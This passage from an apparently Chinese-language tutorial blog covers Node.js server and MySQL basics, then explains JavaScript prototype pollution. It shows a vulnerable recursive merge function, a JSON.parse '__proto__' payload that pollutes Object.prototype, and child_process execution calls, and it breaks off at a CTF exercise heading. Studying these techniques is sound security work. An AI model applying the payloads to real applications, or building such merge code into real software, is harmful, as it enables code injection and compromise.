charset=utf-8&#x27;</span>&#125;);<br>    res.end(util.inspect(<span class="hljs-built_in">url</span>.parse(req.url, <span class="hljs-literal">true</span>)));<br>&#125;).listen(<span class="hljs-number">3000</span>);<br></code></pre></td></tr></table></figure><p>获取url的参数</p><figure class="highlight qml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs qml"><span class="hljs-keyword">var</span> http = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;http&#x27;</span>);<br><span class="hljs-keyword">var</span> <span class="hljs-built_in">url</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;url&#x27;</span>);<br><span class="hljs-keyword">var</span> util = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;util&#x27;</span>);<br> <br>http.createServer(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>)</span>&#123;<br>    res.writeHead(<span class="hljs-number">200</span>, &#123;<span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;text/plain&#x27;</span>&#125;);<br> <br>    <span class="hljs-comment">// 解析 url 参数</span><br>    <span class="hljs-keyword">var</span> params = <span class="hljs-built_in">url</span>.parse(req.url, <span class="hljs-literal">true</span>).query;<br>    res.write(<span class="hljs-string">&quot;网站名：&quot;</span> + params.name);<br>    res.write(<span class="hljs-string">&quot;\n&quot;</span>);<br>    res.write(<span class="hljs-string">&quot;网站 URL：&quot;</span> + params.url);<br>    res.end();<br> <br>&#125;).listen(<span class="hljs-number">3000</span>);<br></code></pre></td></tr></table></figure><p>获取post的内容</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> http = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;http&#x27;</span>);<br><span class="hljs-keyword">var</span> querystring = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;querystring&#x27;</span>);<br><span class="hljs-keyword">var</span> util = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;util&#x27;</span>);<br> <br>http.createServer(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>)</span>&#123;<br>    <span class="hljs-comment">// 定义了一个post变量，用于暂存请求体的信息</span><br>    <span class="hljs-keyword">var</span> post = <span class="hljs-string">&#x27;&#x27;</span>;     <br> <br>    <span class="hljs-comment">// 通过req的data事件监听函数，每当接受到请求体的数据，就累加到post变量中</span><br>    req.on(<span class="hljs-string">&#x27;data&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">chunk</span>)</span>&#123;    <br>        post += chunk;<br>    &#125;);<br> <br>    <span class="hljs-comment">// 在end事件触发后，通过querystring.parse将post解析为真正的POST请求格式，然后向客户端返回。</span><br>    req.on(<span class="hljs-string">&#x27;end&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;    <br>        post = querystring.parse(post);<br>        res.end(util.inspect(post));<br>    &#125;);<br>&#125;).listen(<span class="hljs-number">3000</span>);<br></code></pre></td></tr></table></figure><p>提交post表单</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> http = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;http&#x27;</span>);<br><span class="hljs-keyword">var</span> querystring = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;querystring&#x27;</span>);<br> <br><span class="hljs-keyword">var</span> postHTML = <br>  <span class="hljs-string">&#x27;&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;title&gt;Node.js 实例&lt;/title&gt;&lt;/head&gt;&#x27;</span> +<br>  <span class="hljs-string">&#x27;&lt;body&gt;&#x27;</span> +<br>  <span class="hljs-string">&#x27;&lt;form method=&quot;post&quot;&gt;&#x27;</span> +<br>  <span class="hljs-string">&#x27;网站名： &lt;input name=&quot;name&quot;&gt;&lt;br&gt;&#x27;</span> +<br>  <span class="hljs-string">&#x27;网站 URL： &lt;input name=&quot;url&quot;&gt;&lt;br&gt;&#x27;</span> +<br>  <span class="hljs-string">&#x27;&lt;input type=&quot;submit&quot;&gt;&#x27;</span> +<br>  <span class="hljs-string">&#x27;&lt;/form&gt;&#x27;</span> +<br>  <span class="hljs-string">&#x27;&lt;/body&gt;&lt;/html&gt;&#x27;</span>;<br> <br>http.createServer(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) </span>&#123;<br>  <span class="hljs-keyword">var</span> body = <span class="hljs-string">&quot;&quot;</span>;<br>  req.on(<span class="hljs-string">&#x27;data&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">chunk</span>) </span>&#123;<br>    body += chunk;<br>  &#125;);<br>  req.on(<span class="hljs-string">&#x27;end&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-comment">// 解析参数</span><br>    body = querystring.parse(body);<br>    <span class="hljs-comment">// 设置响应头部信息及编码</span><br>    res.writeHead(<span class="hljs-number">200</span>, &#123;<span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;text/html; charset=utf8&#x27;</span>&#125;);<br> <br>    <span class="hljs-keyword">if</span>(body.name &amp;&amp; body.url) &#123; <span class="hljs-comment">// 输出提交的数据</span><br>        res.write(<span class="hljs-string">&quot;网站名：&quot;</span> + body.name);<br>        res.write(<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>);<br>        res.write(<span class="hljs-string">&quot;网站 URL：&quot;</span> + body.url);<br>    &#125; <span class="hljs-keyword">else</span> &#123;  <span class="hljs-comment">// 输出表单</span><br>        res.write(postHTML);<br>    &#125;<br>    res.end();<br>  &#125;);<br>&#125;).listen(<span class="hljs-number">3000</span>);<br></code></pre></td></tr></table></figure><h2 id="十四、Express框架"><a href="#十四、Express框架" class="headerlink" title="十四、Express框架"></a>十四、Express框架</h2><p>利用Express框架<br>实现GEt方法提交两个参数和POST方法提交两个参数<br>完成文件上传 要本地安装multer模块  在目录下能看到上传的文件<br>对cookie进行管理  要本地安装cookie-parser模块 在服务终端能看到cookie信息</p><h2 id="连接数据库"><a href="#连接数据库" class="headerlink" title="连接数据库"></a>连接数据库</h2><p>以mysql为例<br>在一项目中test.js文件是nodejs与mysql的配置信息</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">var mysql      = require(<span class="hljs-string">&#x27;mysql&#x27;</span>);<br>var <span class="hljs-keyword">connection</span> = mysql.createConnection(&#123;<br>  host     : <span class="hljs-string">&#x27;localhost&#x27;</span>,<br>  <span class="hljs-keyword">user</span>     : <span class="hljs-string">&#x27;root&#x27;</span>,<br>  <span class="hljs-keyword">password</span> : <span class="hljs-string">&#x27;root&#x27;</span>,<br>  <span class="hljs-keyword">database</span> : <span class="hljs-string">&#x27;test&#x27;</span><br>&#125;);<br> <br><span class="hljs-keyword">connection</span>.<span class="hljs-keyword">connect</span>();<br> <br><span class="hljs-keyword">connection</span>.query(<span class="hljs-string">&#x27;SELECT 1 + 1 AS solution&#x27;</span>, <span class="hljs-keyword">function</span> (error, results, fields) &#123;<br>  <span class="hljs-keyword">if</span> (error) throw error;<br>  console.log(<span class="hljs-string">&#x27;The solution is: &#x27;</span>, results[<span class="hljs-number">0</span>].solution);<br>&#125;);<br></code></pre></td></tr></table></figure><p>如果成功连接数据库的话 输出2</p><p>可以在其他js中查询数据库的信息<br>以查一个表为例 数据库可以自行创建</p><p>启动数据库 查一下<br>然后用sql.js查一下 所以可以通过修改<br>里面的sql=’查询语句’就可以进行数据库操作了</p><p>项目</p><p>也可以nodejs安装MongoDB来对数据库进行操作</p><h1 id="Prototype-Pollution-Attack"><a href="#Prototype-Pollution-Attack" class="headerlink" title="Prototype Pollution Attack"></a>Prototype Pollution Attack</h1><p>常用的执行函数</p><blockquote><p>require(‘child_process’).spawnSync(‘ls’,[‘.’]).stdout.toString()</p><p>stdout用来捕获输出</p><p>还有exec，execSync，spawn，spawnSync(这两个需要stdout来捕获输出)</p></blockquote><h2 id="JavaScript中的对象"><a href="#JavaScript中的对象" class="headerlink" title="JavaScript中的对象"></a>JavaScript中的对象</h2><h3 id="建立对象"><a href="#建立对象" class="headerlink" title="建立对象"></a>建立对象</h3><p>JavaScript中 建立对象有两种形式</p><ul><li><p>构造函数创建</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">student</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-built_in">this</span>.name = <span class="hljs-string">&quot;Yuyan Peng&quot;</span>;<br>    <span class="hljs-built_in">this</span>.test = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">2333</span>;<br>    &#125;<br>&#125;<br>student.prototype.a=<span class="hljs-number">3</span>;<br>stu = <span class="hljs-keyword">new</span> student();<br><span class="hljs-built_in">console</span>.log(stu.test());<br><span class="hljs-built_in">console</span>.log(stu.a);<br></code></pre></td></tr></table></figure></li><li><p>通过Object创建</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> a = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Object</span>();<br>a.c=<span class="hljs-number">3</span><br><span class="hljs-built_in">console</span>.log(a.c)<br></code></pre></td></tr></table></figure></li></ul><p>对于使用过基于类的语言 (如 Java 或 C++) 的开发人员来说，JavaScript 有点令人困惑，因为它是动态的，并且本身不提供一个 class 实现。（在 ES2015/ES6 中引入了 class 关键字，但那只是语法糖，JavaScript 仍然是基于原型的）。 之前我们所认为的类在js中都是用函数来声明的 （事实上js不承认类 只是有相应的概念而已 下面为了说明方便 都沿用类的说法） 举个栗子</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs abnf">function test（）&#123;<br>    this.a = <span class="hljs-string">&quot;joy&quot;</span><span class="hljs-comment">;</span><br>&#125;<br><br><span class="hljs-attribute">b</span> = new test<span class="hljs-comment">;</span><br>console.log(b.a)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>从上面可以看到 实例化对象b后就可以输出test类的属性a了 我们其实很容易想到构造函数 构造函数就是在new一个对象的时候被调用 在这其实就是js的一个重要概念——继承，继承的整个对应关系就是这个对象的原型链 所以 <code>test()函数就是类test的构造函数</code></p><p>上面没问题我们继续：</p><h3 id="prototype和-proto"><a href="#prototype和-proto" class="headerlink" title="prototype和__proto__"></a>prototype和__proto__</h3><p>一个类中必定有一些方法比如说属性this.age 把方法定义在构造函数内部：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">student</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-built_in">this</span>.age=<span class="hljs-number">19</span>;<br>    <span class="hljs-built_in">this</span>.show=<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-built_in">console</span>.log(<span class="hljs-built_in">this</span>.age)<br>        &#125;<br>    &#125;<br><br>(<span class="hljs-keyword">new</span> student).show();<br></code></pre></td></tr></table></figure><p>再一次看到 new一个对象就会继承到它的属性 在新开辟的存储空间就已经存放有对应的属性了 </p><p>但这样写有一个问题 每当我需要创建一个student对象的时候this.show = function{…}就会执行一次 这个show方法是绑定在对象上的 而不是绑定在“类”上的</p><ul><li><p><input checked="" disabled="" type="checkbox">  prototype<br>用原型prototype实现</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Student</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-built_in">this</span>.age=<span class="hljs-number">19</span>;<br>&#125;<br><br>Student.prototype.show = <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">show</span>(<span class="hljs-params"></span>)</span>&#123;<span class="hljs-built_in">console</span>.log(<span class="hljs-built_in">this</span>.age)&#125;<br><br><span class="hljs-keyword">var</span> stu = <span class="hljs-keyword">new</span> Student;<br>stu.show();<br></code></pre></td></tr></table></figure><p>prototype是类Student的一个属性 所有类对象在实例化后都具有和prototype中的变量、属性和方法 同时只有类才有prototype属性，但是类<code>实例化出来的对象</code>却没有prototype 不能通过prototype访问实例化对象的原型</p></li><li><p>__proto__<br>就上例而言 我们可以通过Student.prototype访问Student类的原型 但是实例化后的对象stu是不能通过prototype访问原型的 这时候我们使用__proto__来访问实例化对象的原型 stu.__proto__==Student.prototype看到二者是等价的</p></li></ul><p><strong>在Java.Script中 万物皆对象</strong><br>所有的变量，函数，数组，对象都始于Object的原型即Object.prototype  对象的__proto__和类的prototype相对应</p><p>特别的 函数也可以使用__proto__因为函数也是对象 后面给予说明</p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/n.png"></p><h3 id="原型链"><a href="#原型链" class="headerlink" title="原型链"></a>原型链</h3><p>在javascript中 每个对象的都有一个指向他的原型(prototype)的内部链接 这个原型对象又有它自己的原型，直到null为止</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-keyword">function</span> <span class="hljs-constructor">Pt()</span>&#123;<br>    this.b = <span class="hljs-string">&quot;I don&#x27;t know what I&#x27;m up to.&quot;</span><br>&#125;<br><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Pt</span>.</span></span>prototype;<br><br>var ppt = <span class="hljs-keyword">new</span> Pt;<br>ppt.__proto__;<br>ppt.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__proto__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__proto__</span>;</span></span><br><br></code></pre></td></tr></table></figure><p>可以看出原型链为ppt-&gt;Pt.prototype-&gt;Object.prototype-&gt;null</p><p>数组<br><img src="https://raw.githubusercontent.com/wo02ie/photo/main/%E5%8E%9F%E5%9E%8B%E9%93%BE2.png"><br>原型链c-&gt;array.prototype-&gt;Object.prototype-&gt;null<br>函数<br><img src="https://raw.githubusercontent.com/wo02ie/photo/main/%E5%8E%9F%E5%9E%8B%E9%93%BE3.png"><br>原型链d-&gt;function.prototype-&gt;Object.prototype-&gt;null</p><p>可见 js中一切皆对象 一切都始于Object.prototype</p><p>总结一下：</p><ul><li>prototype是类的属性 所有类对象实例化都会从prototype继承属性和方法</li><li>一个对象的__proto__属性指向这个实例化这个对象的类的prototype属性</li></ul><p><code>instanceof运算符</code>，它可以用来判断某个构造函数的prototype属性是否存在另外一个要检测对象的原型链，下面是instanceof运算符的一个实例</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Pt</span>(<span class="hljs-params"></span>)</span>&#123;&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Ob</span>(<span class="hljs-params"></span>)</span>&#123;&#125;<br><br><span class="hljs-keyword">var</span> ppt = <span class="hljs-keyword">new</span> Pt;<br><span class="hljs-built_in">console</span>.info(ppt <span class="hljs-keyword">instanceof</span> Pt)<span class="hljs-comment">//true //ppt.__proto__===Pt.prototype</span><br><span class="hljs-built_in">console</span>.info(ppt <span class="hljs-keyword">instanceof</span> ob)<span class="hljs-comment">//false 因为对象ppt的原型不是Ob</span><br></code></pre></td></tr></table></figure><p>上面说到函数也是一个对象</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">hello</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-built_in">this</span>.test = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;hello world&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">2333</span>;<br>    &#125;<br><br><span class="hljs-keyword">var</span> lib = <span class="hljs-keyword">new</span> hello;<br>lib.test();<br><br><span class="hljs-built_in">console</span>.log(hello <span class="hljs-keyword">instanceof</span> <span class="hljs-built_in">Object</span>)<span class="hljs-comment">//ture 得证</span><br></code></pre></td></tr></table></figure><h3 id="原型链的变量搜索"><a href="#原型链的变量搜索" class="headerlink" title="原型链的变量搜索"></a>原型链的变量搜索</h3><p>来看一个例子</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">I</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-built_in">this</span>.a = <span class="hljs-string">&quot;abc&quot;</span>;<br>    <span class="hljs-built_in">this</span>.b = <span class="hljs-string">&quot;123&quot;</span>;<br>&#125;<br><br><span class="hljs-keyword">var</span> j = <span class="hljs-keyword">new</span>(I);<br>I.prototype.c = <span class="hljs-string">&quot;789&quot;</span>;<br><span class="hljs-built_in">console</span>.log(j.c);<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211119005530731.png" alt="image-20211119005530731"><br>能看出什么</p><p>实例化I后，对象j不应该有属性c，但此时给类对象I新增一个属性时，在j中也有了c属性，这是类与对象中从未见过的</p><p>当要使用或输出一个变量时：首先会在本层中搜索相应的变量，如果不存在的话，就会向上搜索，即在自己的父类中搜索，当父类中也没有时，就会向祖父类搜索，直到指向null，如果此时还没有搜索到，就会返回 undefined</p><p>那么此时的原型链就是j-&gt;I.prototype-&gt;Object.prototype-&gt;null</p><p>js的这个查找机制 就是运用在面向对象的继承中 称作prototype继承链</p><p>⭐说到这里再一次总结如下</p><ul><li>每个构造函数(constructor)都有一个原型对象(prototype)</li><li>对象的__proto__属性，指向类的原型对象prototype</li><li>JavaScript使用prototype链实现继承机制</li></ul><h3 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染"></a>原型链污染</h3><p>下面我们来看</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">var Student = &#123;age:<span class="hljs-number">19</span>&#125;<br><br>console.log(<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Student</span>.</span></span>age)<br><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Student</span>.</span><span class="hljs-module"><span class="hljs-identifier">__proto__</span>.</span></span>age = <span class="hljs-number">20</span><br><br>console.log(<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Student</span>.</span></span>age)<br><br>var Teacher = &#123;&#125;<br><br>console.log(<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Teacher</span>.</span></span>age)<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93.png"></p><p>原型链：Student.__proto__-&gt;Object.prototype-&gt;null</p><p>随着上面的逐步探讨 原型链污染及其产生的漏洞也就呼之欲出了 我们通过控制父类甚至祖类的属性(修改这个对象的原型)就可以影响来自同一个类、父祖类的对象 这就是原型链污染</p><p>看一个例子</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-comment">//First.a或者First[&#x27;a&#x27;]对数组元素的访问 </span><br><span class="hljs-number">1.</span><br><span class="hljs-keyword">var</span> <span class="hljs-built_in">First</span> = Array();<br><span class="hljs-built_in">First</span>[<span class="hljs-string">&#x27;aa&#x27;</span>] = <span class="hljs-string">&quot;aaa&quot;</span>;<br><span class="hljs-built_in">First</span>[<span class="hljs-string">&#x27;bb&#x27;</span>] = <span class="hljs-string">&quot;bbb&quot;</span>;<br><span class="hljs-built_in">First</span>.aa<br><span class="hljs-built_in">First</span>.bb<br><br><span class="hljs-number">2.</span>   <br><span class="hljs-keyword">var</span> <span class="hljs-built_in">Second</span> = &#123;<span class="hljs-string">&quot;c&quot;</span>:<span class="hljs-string">&quot;ccc&quot;</span>,<span class="hljs-string">&quot;d&quot;</span>:<span class="hljs-string">&quot;ddd&quot;</span>&#125;<br>typeof <span class="hljs-built_in">Second</span>;<br><span class="hljs-built_in">Second</span>.c<br><span class="hljs-built_in">Second</span>[<span class="hljs-string">&#x27;c&#x27;</span>]<br></code></pre></td></tr></table></figure><p>上面的prototype是一样的<br>看一组 Second.__proto__==Second[“__proto__“]=Object.prototype</p><p>所以说，原型链污染一般会出现在对象、或数组的键名或属性名可控,而且是赋值语句的情况下 下面是个失败案例</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">function <span class="hljs-keyword">merge</span>(target, source)&#123; <br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> <span class="hljs-keyword">key</span> <span class="hljs-keyword">in</span> source)&#123; <br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">key</span> <span class="hljs-keyword">in</span> source &amp;&amp; <span class="hljs-keyword">key</span> <span class="hljs-keyword">in</span> target)&#123;<br>            <span class="hljs-keyword">merge</span>(target[<span class="hljs-keyword">key</span>], source[<span class="hljs-keyword">key</span>]) <br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>                target[<span class="hljs-keyword">key</span>] = source[<span class="hljs-keyword">key</span>] <br>        &#125; <br>     &#125; <br>&#125; <br></code></pre></td></tr></table></figure><p>试一下</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">let</span> o<span class="hljs-number">1</span> = &#123;&#125; <br><span class="hljs-attribute">let</span> o<span class="hljs-number">2</span> = &#123;a: <span class="hljs-number">1</span>,<span class="hljs-string">&quot;__proto__&quot;</span>: &#123;b: <span class="hljs-number">2</span>&#125;&#125; <br><span class="hljs-attribute">merge</span>(o<span class="hljs-number">1</span>, o<span class="hljs-number">2</span>) <br><span class="hljs-attribute">console</span>.log(o<span class="hljs-number">1</span>.a, o<span class="hljs-number">1</span>.b) <br><span class="hljs-attribute">o3</span> = &#123;&#125; <br><span class="hljs-attribute">console</span>.log(o<span class="hljs-number">3</span>.b)<br></code></pre></td></tr></table></figure><p>哑火了，payload并没有达到我们的预期，用JavaScript创建o2的过程（let o2 = {a: 1, “__proto__“: {b: 2}}）中，__proto__已经代表o2的原型了，我们的键值相当于自定义了一个原型对象，没法在新的对象中添加__proto__键值，此时遍历o2的所有键名，拿到的只是[a, b]，__proto__并不是一个key，自然也不会修改Object的原型。</p><p>那么，如何让__proto__被认为是一个键名呢？用JSON解析一下键值对(JSON.parse 会把一个json字符串 转化为 javascript的object)，将代码改成如下：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">let</span> o<span class="hljs-number">1</span> = &#123;&#125; <br><span class="hljs-attribute">let</span> o<span class="hljs-number">2</span> = JSON.parse(&#x27;&#123;<span class="hljs-string">&quot;a&quot;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&quot;__proto__&quot;</span>: &#123;<span class="hljs-string">&quot;b&quot;</span>: <span class="hljs-number">2</span>&#125;&#125;&#x27;) //?数组元素双引号<br><span class="hljs-attribute">merge</span>(o<span class="hljs-number">1</span>, o<span class="hljs-number">2</span>) <br><span class="hljs-attribute">console</span>.log(o<span class="hljs-number">1</span>.a, o<span class="hljs-number">1</span>.b) <br><span class="hljs-attribute">o3</span> = &#123;&#125; <br><span class="hljs-attribute">console</span>.log(o<span class="hljs-number">3</span>.b)<br></code></pre></td></tr></table></figure><p>可见，新建的o3对象，也存在b属性，说明Object已经被污染，因为JSON解析下，__proto__会被认为是一个真正的“键名”，而不代表“原型”，所以在遍o2时会存在这个键</p><p>merge操作时最常见的可能控制键名的操作，也最能被原型链攻击，很多常见的库都存在这个问题</p><p>有哪些情况原型链会被污染？哪些情况原型链能被修改呢？哪些情况下我们可以设置__proto__的值呢？<br>其实找找能够控制数组（对象）的“键名”的操作即可：    </p><ul><li>对象merge</li><li>对象clone（其实内核就是将待操作的对象merge到一个空对象中）</li></ul><blockquote><p>存在影响目标类型的同型，该同型的参数可控</p></blockquote><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/%E6%B1%A1%E6%9F%93.png"></p><p><strong>原型链污染</strong>利用的关键就是找到可以覆盖的属性或者方法。</p><p>这类漏洞的关键主要是在 compile编译 截断，通过原型链污染覆盖某些属性，在编译过程中注入模板，在渲染的时候就会执行我们注入的恶意代码。</p><p>限制：</p><ul><li>保证能够执行到渲染阶段，因为覆盖某些属性会导致莫名其妙的异常</li><li>被覆盖的属性无硬编码默认值</li></ul><h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><h4 id="ctfshow338"><a href="#ctfshow338" class="headerlink" title="ctfshow338"></a>ctfshow338</h4><p>下载附件</p><blockquote><p>npm 